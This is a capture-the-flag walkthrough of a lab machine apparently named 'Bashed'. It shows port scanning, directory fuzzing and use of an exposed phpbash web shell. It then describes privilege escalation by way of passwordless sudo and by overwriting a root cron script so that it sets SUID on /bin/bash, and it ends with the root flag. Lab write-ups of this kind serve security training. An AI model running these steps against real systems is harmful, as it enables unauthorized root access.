## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nmap 10.129.39.129 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-19 10:56 +0545
Nmap scan report for 10.129.39.129
Host is up (0.28s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds
```

## Enemurating Port 80:

The index page consists of blog of phpbash, where one can execute bash commands through the web interface. 
Le'ts fuzz:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ ffuf -u http://10.129.39.129/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c -ic -t 2000

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.39.129/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 2000
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

php                     [Status: 301, Size: 312, Words: 20, Lines: 10]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
                        [Status: 200, Size: 7743, Words: 2956, Lines: 162]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
                        [Status: 200, Size: 7743, Words: 2956, Lines: 162]
```
After revewing the discovered endpoint, the `/dev` directory contains phpbash which is web interface for executing bash commands where `../uploads` is writeable, we can upload our reverse shell there.

```bash
www-data@bashed:/var/www/html/dev# ls -la ../uploads

total 12
drwxrwxrwx 2 root root 4096 Jun 2 2022 .
drw-r-xr-x 10 root root 4096 Jun 2 2022 ..
-rwxrwxrwx 1 root root 14 Dec 4 2017 index.html
```

this is how we get our shell as www-data.

## Privilege Escalation:

```bash
www-data@bashed:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

We can run all commands as scriptmanager without password, let's check what we can do with this user.

```bash
sudo -u scriptmanager /bin/bash

scriptmanager@bashed:/$ ls -la /
ls -la /
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            212 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Dec 18 21:05 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 176 root          root              0 Dec 18 21:05 proc
drwx------   3 root          root           4096 Dec 18 21:06 root
drwxr-xr-x  18 root          root            520 Dec 18 21:05 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Dec 18 21:40 sys
drwxrwxrwt  10 root          root           4096 Dec 18 21:41 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

We can see that scriptmanager has write access to `/scripts` directory, let's check what we can do with this directory.

```bash
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Dec 18 21:42 test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

There is file called test.py which is owned by scriptmanager, checking the content, it just writes to the file called test.txt, but looking at the ownership we can see the file test.txt is owned by root. We already can assume that there's cronjob on test.py running as root, so we can abuse this to run any command as root.

```bash
scriptmanager@bashed:/scripts$ echo "import os;os.system('chmod u+s /bin/bash')">test.py
scriptmanager@bashed:/scripts$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cat /root/root.txt
cat /root/root.txt
33b16ed960c3e02c7b52bc7dd2cea7f4
```